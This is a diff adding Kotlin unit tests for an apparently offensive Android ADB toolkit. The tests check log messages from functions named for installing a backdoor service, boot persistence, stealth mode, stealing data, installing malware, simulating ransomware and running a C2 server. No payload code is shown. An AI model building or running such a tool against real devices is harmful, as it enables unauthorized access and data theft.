@@ -50,8 +50,193 @@ class MainTest {
         assertTrue(output.contains("15. Get Device Info"))
         assertTrue(output.contains("16. Read Logcat"))
         assertTrue(output.contains("17. Check Device Status"))
-        assertTrue(output.contains("18. C2 - Start Server (already integrated in Prepare Attack)"))
+        assertTrue(output.contains("18. C2 - Start Server"))
         assertTrue(output.contains("19. C2 - Stop Server"))
         assertTrue(output.contains("0. Exit"))
+    }
+
+    @Test
+    fun testPrepareAttack() {
+        val adb = ADBBase()
+        adb.prepareAttack()
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Enabling stealth mode"))
+        assertTrue(output.contains("Setting up TCP/IP on port"))
+        assertTrue(output.contains("Fetching device IP"))
+        assertTrue(output.contains("Installing backdoor service"))
+        assertTrue(output.contains("Scheduling persistent task"))
+        assertTrue(output.contains("Attempting boot persistence via BootReceiver"))
+        assertTrue(output.contains("Listing files in /sdcard/Download"))
+        assertTrue(output.contains("Starting C2 server"))
+    }
+
+    @Test
+    fun testStealAllData() {
+        val adb = ADBBase()
+        val destination = "/sdcard/stolen_data"
+        adb.exfiltrateData(destination)
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Stealing all accessible data to: $destination"))
+    }
+
+    @Test
+    fun testDumpSystemInfo() {
+        val adb = ADBBase()
+        val destination = "/sdcard/system_info"
+        adb.dumpSystemInfo(destination)
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Dumping system information to: $destination"))
+    }
+
+    @Test
+    fun testSimulateRansomware() {
+        val adb = ADBBase()
+        adb.simulateRansomware()
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Simulating ransomware"))
+    }
+
+    @Test
+    fun testInstallMalware() {
+        val adb = ADBBase()
+        val apkPath = "path/to/malware.apk"
+        adb.installMalware(apkPath)
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Installing malware from: $apkPath"))
+    }
+
+    @Test
+    fun testExecuteShellCommand() {
+        val adb = ADBBase()
+        val command = "ls /sdcard"
+        val result = adb.executeMaliciousCommand(command)
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Executing command: $command"))
+        assertTrue(output.contains(result.output))
+    }
+
+    @Test
+    fun testListFiles() {
+        val adb = ADBBase()
+        val path = "/sdcard/"
+        val fileList = adb.listFiles(path)
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Listing files in: $path"))
+        assertTrue(output.contains(fileList))
+    }
+
+    @Test
+    fun testPullFile() {
+        val adb = ADBBase()
+        val devicePath = "/sdcard/file.txt"
+        val localPath = "local/file.txt"
+        adb.pullFile(devicePath, localPath)
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Pulling '$devicePath' to '$localPath'"))
+    }
+
+    @Test
+    fun testPushFile() {
+        val adb = ADBBase()
+        val localPath = "local/file.txt"
+        val devicePath = "/sdcard/file.txt"
+        adb.pushFile(localPath, devicePath)
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Pushing '$localPath' to '$devicePath'"))
+    }
+
+    @Test
+    fun testInstallAPK() {
+        val adb = ADBBase()
+        val apkPath = "path/to/app.apk"
+        adb.installApk(apkPath)
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Installing APK from: $apkPath"))
+    }
+
+    @Test
+    fun testUninstallApp() {
+        val adb = ADBBase()
+        val packageName = "com.example.app"
+        adb.uninstallApp(packageName)
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Uninstalling package: $packageName"))
+    }
+
+    @Test
+    fun testClearAppData() {
+        val adb = ADBBase()
+        val packageName = "com.example.app"
+        adb.clearAppData(packageName)
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Clearing data for: $packageName"))
+    }
+
+    @Test
+    fun testRebootDevice() {
+        val adb = ADBBase()
+        adb.rebootDevice()
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Rebooting device"))
+    }
+
+    @Test
+    fun testTakeScreenshot() {
+        val adb = ADBBase()
+        val filename = "screenshot.png"
+        adb.takeScreenshot(filename)
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Taking screenshot and saving as $filename"))
+    }
+
+    @Test
+    fun testGetDeviceInfo() {
+        val adb = ADBBase()
+        val model = adb.getDeviceModel()
+        val serial = adb.getDeviceSerialNumber()
+        val androidVersion = adb.getAndroidVersion()
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Device Information:"))
+        assertTrue(output.contains("Model: $model"))
+        assertTrue(output.contains("Serial: $serial"))
+        assertTrue(output.contains("Android Version: $androidVersion"))
+    }
+
+    @Test
+    fun testReadLogcat() {
+        val adb = ADBBase()
+        val logcatOutput = adb.readLogcat()
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("--- Logcat Output ---"))
+        assertTrue(output.contains(logcatOutput))
+        assertTrue(output.contains("--- End of Logcat ---"))
+    }
+
+    @Test
+    fun testCheckDeviceStatus() {
+        val adb = ADBBase()
+        val adbAccessible = adb.isAdbAccessible()
+        val rooted = adb.isDeviceRooted()
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("--- Device Status ---"))
+        assertTrue(output.contains("ADB Accessible: $adbAccessible"))
+        assertTrue(output.contains("Rooted: $rooted"))
+        assertTrue(output.contains("--- End of Status ---"))
+    }
+
+    @Test
+    fun testStartC2Server() {
+        val adb = ADBBase()
+        adb.startC2Server()
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Starting C2 server"))
+    }
+
+    @Test
+    fun testStopC2Server() {
+        val adb = ADBBase()
+        adb.stopC2Server()
+        val output = outputStreamCaptor.toString().trim()
+        assertTrue(output.contains("Stopping C2 server"))
     }
 }
